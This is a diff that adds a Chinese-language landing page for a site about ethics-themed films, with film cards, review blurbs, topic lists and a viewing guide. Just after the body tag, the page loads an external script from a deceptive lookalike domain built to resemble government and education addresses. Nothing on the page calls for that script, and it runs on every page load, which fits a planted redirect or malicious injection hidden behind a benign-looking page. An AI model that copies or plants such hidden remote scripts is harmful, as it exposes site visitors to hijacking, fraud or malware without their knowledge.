@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="神马伦理电影网——分享经典伦理题材电影资讯、影评与观影指南，聚焦人性、家庭、情感与道德抉择的影像世界。">
+<meta name="keywords" content="神马伦理电影网, 伦理电影, 经典伦理片, 电影影评, 人性电影">
+<meta name="author" content="神马伦理电影网">
+<meta name="theme-color" content="#0f172a">
+<title>神马伦理电影网 | 经典伦理电影资讯与影评</title>
+<style>
+  :root{
+    --bg:#070b16;
+    --bg2:#0f172a;
+    --card:#121c33;
+    --line:rgba(255,255,255,.08);
+    --txt:#e8ecf5;
+    --sub:#9aa7c4;
+    --gold:#e9b872;
+    --gold2:#f5d29a;
+    --accent:#7c4dff;
+    --accent2:#22d3ee;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+  body{
+    font-family:"PingFang SC","Microsoft YaHei","Helvetica Neue",Arial,sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    line-height:1.75;
+    overflow-x:hidden;
+  }
+  a{color:var(--gold);text-decoration:none;transition:.25s}
+  a:hover{color:var(--gold2)}
+  .wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+
+  /* 顶部导航 */
+  header{
+    position:sticky;top:0;z-index:50;
+    background:rgba(7,11,22,.82);
+    backdrop-filter:blur(12px);
+    border-bottom:1px solid var(--line);
+  }
+  .nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+  .logo{display:flex;align-items:center;gap:10px;font-weight:800;letter-spacing:.5px}
+  .logo .mark{
+    width:34px;height:34px;border-radius:9px;
+    background:linear-gradient(135deg,var(--gold),var(--accent));
+    display:grid;place-items:center;color:#070b16;font-size:18px;font-weight:900;
+  }
+  .logo span{font-size:17px}
+  .logo small{color:var(--sub);font-weight:500;font-size:12px;margin-left:6px}
+  .nav-links{display:flex;gap:6px}
+  .nav-links a{
+    color:var(--sub);font-size:14px;padding:8px 12px;border-radius:8px;
+  }
+  .nav-links a:hover{color:var(--txt);background:rgba(255,255,255,.06)}
+  .menu-btn{display:none;background:none;border:none;color:var(--gold);font-size:26px;cursor:pointer}
+
+  /* 首屏 */
+  .hero{
+    position:relative;padding:90px 0 70px;
+    background:
+      radial-gradient(900px 400px at 80% -10%,rgba(124,77,255,.28),transparent 60%),
+      radial-gradient(700px 360px at 0% 10%,rgba(233,184,114,.18),transparent 55%),
+      linear-gradient(180deg,var(--bg2),var(--bg));
+    border-bottom:1px solid var(--line);
+  }
+  .hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:48px;align-items:center}
+  .eyebrow{
+    display:inline-block;font-size:12px;letter-spacing:2px;color:var(--gold);
+    border:1px solid rgba(233,184,114,.35);padding:5px 14px;border-radius:30px;margin-bottom:18px;
+  }
+  h1{font-size:44px;line-height:1.2;font-weight:900;letter-spacing:-.5px}
+  h1 em{font-style:normal;background:linear-gradient(90deg,var(--gold2),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .hero p{color:var(--sub);font-size:16px;margin:18px 0 26px;max-width:540px}
+  .cta{display:flex;flex-wrap:wrap;gap:12px}
+  .btn{
+    display:inline-flex;align-items:center;gap:8px;
+    padding:13px 24px;border-radius:12px;font-weight:700;font-size:15px;
+    border:1px solid transparent;cursor:pointer;
+  }
+  .btn-primary{background:linear-gradient(135deg,var(--gold),var(--accent));color:#070b16}
+  .btn-ghost{border-color:var(--line);color:var(--txt);background:transparent}
+  .btn:hover{transform:translateY(-2px)}
+  .hero-card{
+    background:var(--card);border:1px solid var(--line);border-radius:20px;
+    padding:22px;box-shadow:0 30px 60px rgba(0,0,0,.45);
+  }
+  .hero-card .poster{
+    height:150px;border-radius:14px;margin-bottom:16px;
+    background:linear-gradient(120deg,#2a1b4d,#4d2a6b 55%,#8a4f2f);
+    display:grid;place-items:center;color:rgba(255,255,255,.75);font-size:13px;letter-spacing:3px;
+  }
+  .hero-card h3{font-size:19px;margin-bottom:8px}
+  .hero-card p{font-size:13px;color:var(--sub)}
+  .tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+  .tags i{font-style:normal;font-size:12px;padding:4px 10px;border-radius:20px;background:rgba(233,184,114,.12);color:var(--gold2)}
+
+  /* 通用区块 */
+  section{padding:72px 0}
+  .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;margin-bottom:34px;flex-wrap:wrap}
+  .sec-head h2{font-size:28px;font-weight:900;letter-spacing:-.3px}
+  .sec-head h2 u{text-decoration:none;color:var(--gold)}
+  .sec-head .lead{color:var(--sub);font-size:14px;max-width:480px}
+  .num{color:var(--accent2);font-weight:800;font-size:13px;letter-spacing:2px}
+
+  /* 栏目一：电影百科 */
+  .grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+  .film{
+    background:var(--card);border:1px solid var(--line);border-radius:16px;overflow:hidden;
+    transition:.3s;
+  }
+  .film:hover{transform:translateY(-6px);border-color:rgba(233,184,114,.4)}
+  .film .cover{height:130px;position:relative}
+  .film .cover .g{position:absolute;inset:0;opacity:.9}
+  .film .cover b{
+    position:absolute;left:12px;top:12px;font-size:11px;font-weight:700;
+    background:rgba(7,11,22,.7);color:var(--gold2);padding:3px 9px;border-radius:6px;
+  }
+  .film .cover u{position:absolute;right:12px;bottom:12px;text-decoration:none;font-size:20px;font-weight:900;text-shadow:0 2px 8px rgba(0,0,0,.6)}
+  .film .body{padding:14px}
+  .film h3{font-size:15px;margin-bottom:6px}
+  .film p{font-size:12.5px;color:var(--sub);display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+
+  /* 栏目二：影评 */
+  .reviews{display:grid;grid-template-columns:1.4fr 1fr;gap:22px}
+  .review-main{
+    background:linear-gradient(160deg,var(--card),#0c1528);
+    border:1px solid var(--line);border-radius:18px;padding:26px;
+  }
+  .review-main .stars{color:var(--gold);letter-spacing:2px;font-size:15px}
+  .review-main h3{font-size:22px;margin:10px 0 12px}
+  .review-main p{color:var(--sub);font-size:14.5px}
+  .review-side{display:flex;flex-direction:column;gap:14px}
+  .rv{
+    background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;
+    display:flex;gap:14px;align-items:flex-start;
+  }
+  .rv .dot{width:10px;height:10px;border-radius:50%;background:var(--accent2);margin-top:8px;flex:none}
+  .rv h4{font-size:15px;margin-bottom:4px}
+  .rv span{font-size:12px;color:var(--gold)}
+
+  /* 栏目三：专题 */
+  .topics{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+  .topic{border-radius:18px;padding:26px;min-height:210px;position:relative;overflow:hidden;border:1px solid var(--line)}
+  .topic::after{content:"";position:absolute;right:-40px;top:-40px;width:160px;height:160px;border-radius:50%;background:rgba(255,255,255,.05)}
+  .topic h3{font-size:19px;margin-bottom:10px;position:relative}
+  .topic p{font-size:13.5px;color:rgba(255,255,255,.8);position:relative}
+  .topic a{position:relative;display:inline-block;margin-top:16px;font-size:13px;font-weight:700;border-bottom:1px solid currentColor;padding-bottom:2px}
+  .t1{background:linear-gradient(135deg,#3b1f6b,#1d2a5e)}
+  .t2{background:linear-gradient(135deg,#7a3b12,#5c1f3a)}
+  .t3{background:linear-gradient(135deg,#0f4c5c,#1e3a5f)}
+
+  /* 栏目四：观影指南 */
+  .guide{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+  .step{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;display:flex;gap:18px}
+  .step .n{
+    font-size:30px;font-weight:900;line-height:1;color:transparent;
+    -webkit-text-stroke:1.5px var(--gold);flex:none;
+  }
+  .step h4{font-size:16px;margin-bottom:6px}
+  .step p{font-size:13.5px;color:var(--sub)}
+
+  /* 栏目五：关于 */
+  .about{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+  .about .txt h2{font-size:30px;margin-bottom:16px}
+  .about .txt p{color:var(--sub);margin-bottom:14px}
+  .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+  .stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px;text-align:center}
+  .stat b{display:block;font-size:26px;background:linear-gradient(90deg,var(--gold2),var(--accent2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  .stat small{color:var(--sub);font-size:12px}
+
+  footer{border-top:1px solid var(--line);padding:40px 0 30px;background:var(--bg2)}
+  .foot-flex{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:24px}
+  .foot-flex p{color:var(--sub);font-size:13px}
+  .foot-nav{display:flex;gap:18px;flex-wrap:wrap}
+  .foot-nav a{color:var(--sub);font-size:13px}
+  .copyright{text-align:center;color:var(--sub);font-size:12px;border-top:1px solid var(--line);padding-top:20px}
+
+  /* 移动端 */
+  @media (max-width:860px){
+    .menu-btn{display:block}
+    .nav-links{
+      position:fixed;inset:64px 0 0 0;flex-direction:column;
+      background:rgba(7,11,22,.97);backdrop-filter:blur(12px);
+      padding:24px;gap:4px;transform:translateX(100%);transition:.35s;
+    }
+    .nav-links.open{transform:translateX(0)}
+    .nav-links a{font-size:17px;padding:14px;border-radius:12px}
+    .hero{padding:56px 0 48px}
+    .hero-grid{grid-template-columns:1fr;gap:32px}
+    h1{font-size:32px}
+    section{padding:54px 0}
+    .grid4,.topics{grid-template-columns:repeat(2,1fr);gap:14px}
+    .reviews,.guide,.about{grid-template-columns:1fr;gap:18px}
+    .sec-head h2{font-size:23px}
+  }
+  @media (max-width:520px){
+    .wrap{padding:0 16px}
+    h1{font-size:27px}
+    .grid4,.topics{grid-template-columns:1fr}
+    .stat b{font-size:22px}
+  }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="wrap nav">
+    <a class="logo" href="#" aria-label="返回顶部">
+      <span class="mark">神</span>
+      <span>神马伦理电影网<small>shenmalunlidianyingwang-app</small></span>
+    </a>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单">≡</button>
+    <nav class="nav-links" id="navLinks">
+      <a href="#films">电影百科</a>
+      <a href="#reviews">深度影评</a>
+      <a href="#topics">专题策划</a>
+      <a href="#guide">观影指南</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 首屏 -->
+  <section class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <span class="eyebrow">ETHICS · CINEMA · INSIGHT</span>
+        <h1>在光影里，读懂<em>人性的抉择</em></h1>
+        <p><strong>神马伦理电影网</strong>（https://shenmalunlidianyingwang-app.github.io）专注于伦理题材电影的梳理、解读与推荐。我们关注家庭、爱情、道德困境与社会边界，让每一部值得被看见的影片都被认真讨论。</p>
+        <div class="cta">
+          <a class="btn btn-primary" href="#films">开始探索影片 →</a>
+          <a class="btn btn-ghost" href="#guide">观影入门</a>
+        </div>
+      </div>
+      <aside class="hero-card">
+        <div class="poster">今 日 精 选</div>
+        <h3>《困在时间里的父亲》</h3>
+        <p>以患者的视角重构记忆与亲情，一场关于尊严、衰老与伦理照护的冷静叩问。</p>
+        <div class="tags">
+          <i>家庭伦理</i><i>记忆</i><i>人性</i><i>奥斯卡</i>
+        </div>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 栏目一：电影百科 -->
+  <section id="films">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <div class="num">01 / 电影百科</div>
+          <h2>经典<em style="color:var(--gold);font-style:normal">伦理片</em>图鉴</h2>
+        </div>
+        <p class="lead">按主题与年代整理的伦理电影名片，涵盖东西方经典，持续更新片单与影片小传。</p>
+      </div>
+      <div class="grid4">
+
+        <article class="film">
+          <div class="cover" style="background:linear-gradient(135deg,#2e1a4d,#6b3a8f)">
+            <span class="g"></span><b>家庭</b><u>01</u>
+          </div>
+          <div class="body">
+            <h3>小偷家族</h3>
+            <p>没有血缘的一家人，在贫困与温情之间游走，重新定义"家庭"的伦理边界。</p>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="cover" style="background:linear-gradient(135deg,#3a1c12,#a1542f)">
+            <span class="g"></span><b>欲望</b><u>02</u>
+          </div>
+          <div class="body">
+            <h3>钢琴课</h3>
+            <p>以沉默的琴键表达被压抑的女性欲望，一场关于表达、占有与自由的选择。</p>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="cover" style="background:linear-gradient(135deg,#0f3d4c,#2f7a8c)">
+            <span class="g"></span><b>救赎</b><u>03</u>
+          </div>
+          <div class="body">
+            <h3>肖申克的救赎</h3>
+            <p>制度、希望与友谊的交织，在绝望中坚守尊严，是关于信念的伦理寓言。</p>
+          </div>
+        </article>
+
+        <article class="film">
+          <div class="cover" style="background:linear-gradient(135deg,#4a1540,#8f2f6b)">
+            <span class="g"></span><b>道德</b><u>04</u>
+          </div>
+          <div class="body">
+            <h3>杀人回忆</h3>
+            <p>真实案件改编，追问正义的缺席与时代的伤痕，冷静而克制地逼近真相。</p>
+          </div>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目二：深度影评 -->
+  <section id="reviews" style="background:linear-gradient(180deg,transparent,rgba(124,77,255,.05))">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <div class="num">02 / 深度影评</div>
+          <h2>不止于<em style="color:var(--gold);font-style:normal">剧情</em>的解读</h2>
+        </div>
+        <p class="lead">从镜头语言、人物动机到社会语境，写下有温度的观影笔记。</p>
+      </div>
+      <div class="reviews">
+
+        <article class="review-main">
+          <div class="stars">★★★★★</div>
+          <h3>当"正确"与"正确"相撞：伦理困境为何没有标准答案</h3>
+          <p>好的伦理电影从不给出结论。它把人物推到两难之间，让观众在共情中被迫思考：亲情与正义、忠诚与诚实、个体与集体，究竟该如何取舍？本文以三部获奖影片为例，拆解导演如何用留白代替说教。</p>
+          <p style="margin-top:12px">关键词：道德两难 · 叙事留白 · 人物弧光</p>
+          <a class="btn btn-ghost" href="#" style="margin-top:18px">阅读全文 →</a>
+        </article>
+
+        <div class="review-side">
+          <article class="rv">
+            <span class="dot"></span>
+            <div>
+              <h4>镜头之外的沉默</h4>
+              <span>家庭伦理 · 8 分钟阅读</span>
+              <p style="color:var(--sub);font-size:13px;margin-top:6px">那些未被说出口的话，往往才是影片真正的主题。</p>
+            </div>
+          </article>
+          <article class="rv">
+            <span class="dot"></span>
+            <div>
+              <h4>东亚家庭中的"孝"与"自我"</h4>
+              <span>社会伦理 · 6 分钟阅读</span>
+              <p style="color:var(--sub);font-size:13px;margin-top:6px">从是枝裕和到李沧东，亲情叙事里的代际张力。</p>
+            </div>
+          </article>
+          <article class="rv">
+            <span class="dot"></span>
+            <div>
+              <h4>女性视角的伦理书写</h4>
+              <span>性别伦理 · 7 分钟阅读</span>
+              <p style="color:var(--sub);font-size:13px;margin-top:6px">当女性成为叙事主体，道德评判的坐标随之改变。</p>
+            </div>
+          </article>
+        </div>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三：专题策划 -->
+  <section id="topics">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <div class="num">03 / 专题策划</div>
+          <h2>一个主题，<em style="color:var(--gold);font-style:normal">一组片单</em></h2>
+        </div>
+        <p class="lead">围绕同一命题策划的观影路径，适合周末一口气刷完。</p>
+      </div>
+      <div class="topics">
+
+        <article class="topic t1">
+          <h3>亲情的温度与重量</h3>
+          <p>从养子、继亲到空巢，五部影片看见家庭关系中最柔软也最锋利的部分。</p>
+          <a href="#">查看片单 →</a>
+        </article>
+
+        <article class="topic t2">
+          <h3>爱与占有之间</h3>
+          <p>当爱越过边界，激情如何变成控制？情感伦理题材的三种典型叙事。</p>
+          <a href="#">查看片单 →</a>
+        </article>
+
+        <article class="topic t3">
+          <h3>科技时代的新伦理</h3>
+          <p>AI、克隆、记忆移植——当技术改写人性，电影给出了怎样的预警？</p>
+          <a href="#">查看片单 →</a>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目四：观影指南 -->
+  <section id="guide" style="border-top:1px solid var(--line)">
+    <div class="wrap">
+      <div class="sec-head">
+        <div>
+          <div class="num">04 / 观影指南</div>
+          <h2>新手也能<em style="color:var(--gold);font-style:normal">看懂</em>伦理片</h2>
+        </div>
+        <p class="lead">四步建立自己的观影坐标系，从"看热闹"到"看门道"。</p>
+      </div>
+      <div class="guide">
+
+        <article class="step">
+          <span class="n">01</span>
+          <div>
+            <h4>先放下"对错"</h4>
+            <p>伦理片的核心不是判决，而是呈现困境。带着问题看，比带着结论看收获更多。</p>
+          </div>
+        </article>
+
+        <article class="step">
+          <span class="n">02</span>
+          <div>
+            <h4>关注"未言之处"</h4>
+            <p>停顿、空镜、沉默的表演，往往藏着导演真正想说的价值判断。</p>
+          </div>
+        </article>
+
+        <article class="step">
+          <span class="n">03</span>
+          <div>
+            <h4>了解时代语境</h4>
+            <p>许多伦理冲突根植于特定的社会与文化背景，补一点背景知识，理解会深一层。</p>
+          </div>
+        </article>
+
+        <article class="step">
+          <span class="n">04</span>
+          <div>
+            <h4>允许不同答案</h4>
+            <p>看完和朋友争论，是伦理片最好的副产品——没有共识，才有思考。</p>
+          </div>
+        </article>
+
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五：关于 -->
+  <section id="about">
+    <div class="wrap about">
+      <div class="txt">
+        <div class="num">05 / 关于神马伦理电影网</div>
+        <h2>我们相信，<br>好电影值得被认真谈论。</h2>
+        <p><strong>神马伦理电影网</strong>（https://shenmalunlidianyingwang-app.github.io）是一个专注于伦理题材电影的内容站点：整理片单、撰写影评、策划专题，为喜欢思考的观众提供一份安静的观影地图。</p>
+        <p>本站仅作影视文化交流与推荐，倡导正版观影，尊重每一位创作者的劳动。</p>
+        <div class="cta">
+          <a class="btn btn-primary" href="#films">浏览影片 →</a>
+        </div>
+      </div>
+      <div class="stats">
+        <div class="stat"><b>120+</b><small>收录影片</small></div>
+        <div class="stat"><b>60+</b><small>原创影评</small></div>
+        <div class="stat"><b>12</b><small>专题策划</small></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-flex">
+      <p><strong style="color:var(--gold2)">神马伦理电影网</strong> · 专注伦理题材电影的资讯与影评</p>
+      <div class="foot-nav">
+        <a href="#films">电影百科</a>
+        <a href="#reviews">深度影评</a>
+        <a href="#topics">专题策划</a>
+        <a href="#guide">观影指南</a>
+        <a href="#about">关于我们</a>
+      </div>
+    </div>
+    <div class="copyright">
+      网站名称：神马伦理电影网 ｜ 网站网址：https://shenmalunlidianyingwang-app.github.io ｜ 倡导正版观影，理性讨论<br>
+      © <span id="year"></span> 神马伦理电影网 shenmalunlidianyingwang-app . All rights reserved.
+    </div>
+  </div>
+</footer>
+
+<script>
+  // 移动端菜单
+  var menuBtn = document.getElementById('menuBtn');
+  var navLinks = document.getElementById('navLinks');
+  menuBtn.addEventListener('click', function(){
+    navLinks.classList.toggle('open');
+    menuBtn.textContent = navLinks.classList.contains('open') ? '×' : '≡';
+  });
+  navLinks.addEventListener('click', function(e){
+    if(e.target.tagName === 'A'){
+      navLinks.classList.remove('open');
+      menuBtn.textContent = '≡';
+    }
+  });
+  // 年份
+  document.getElementById('year').textContent = new Date().getFullYear();
+</script>
+</body>
+</html>
